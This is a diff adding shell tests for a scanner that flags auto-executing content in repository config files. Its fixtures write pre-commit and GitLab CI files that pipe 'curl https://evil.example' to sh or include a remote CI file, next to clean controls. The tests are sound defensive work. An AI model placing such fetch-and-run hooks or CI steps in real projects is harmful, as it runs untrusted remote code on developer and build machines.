@@ -7511,6 +7511,43 @@ printf 'VER := $(shell git rev-parse HEAD)\nall:\n\tgcc -o x x.c\n' \
     && check "file: Makefile dollar-shell-git clean" "0" "0" \
     || check "file: Makefile dollar-shell-git clean" "0" "1"
 rm -rf "$MDIR"
+# pre-commit local hooks: repo-supplied autoexec on git commit
+PDIR=$(mktemp -d)
+printf 'repos:\n- repo: local\n  hooks:\n    - id: x\n      entry: bash -c "curl https://evil.example | sh"\n' \
+    > "$PDIR/.pre-commit-config.yaml"
+./hlse_core package --manifest "$PDIR/.pre-commit-config.yaml" 2>&1 \
+    | grep -q "ide autoexec" \
+    && check "pkg: pre-commit local+execish entry flagged" "0" "0" \
+    || check "pkg: pre-commit local+execish entry flagged" "0" "1"
+printf 'repos:\n- repo: https://github.com/psf/black\n  hooks:\n    - id: black\n' \
+    > "$PDIR/.pre-commit-config.yaml"
+./hlse_core package --manifest "$PDIR/.pre-commit-config.yaml" 2>&1 \
+    | grep -q "OK" \
+    && check "pkg: upstream pre-commit config clean" "0" "0" \
+    || check "pkg: upstream pre-commit config clean" "0" "1"
+rm -rf "$PDIR"
+# gitlab-ci: block-scalar script + include:remote
+LDIR=$(mktemp -d)
+printf 'job:\n  script:\n    - curl https://evil.example | sh\n' \
+    > "$LDIR/.gitlab-ci.yml"
+./hlse_core package --manifest "$LDIR/.gitlab-ci.yml" 2>&1 \
+    | grep -q "gitlab-ci script" \
+    && check "pkg: gitlab-ci script pipe flagged" "0" "0" \
+    || check "pkg: gitlab-ci script pipe flagged" "0" "1"
+printf 'include:\n  - remote: https://evil.example/ci.yml\n' \
+    > "$LDIR/.gitlab-ci.yml"
+./hlse_core package --manifest "$LDIR/.gitlab-ci.yml" 2>&1 \
+    | grep -q "remote" \
+    && check "pkg: gitlab-ci include:remote flagged" "0" "0" \
+    || check "pkg: gitlab-ci include:remote flagged" "0" "1"
+printf 'job:\n  script:\n    - npm test\n    - npm run build\n' \
+    > "$LDIR/.gitlab-ci.yml"
+./hlse_core package --manifest "$LDIR/.gitlab-ci.yml" 2>&1 \
+    | grep -q "OK" \
+    && check "pkg: plain gitlab-ci clean" "0" "0" \
+    || check "pkg: plain gitlab-ci clean" "0" "1"
+rm -rf "$LDIR"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
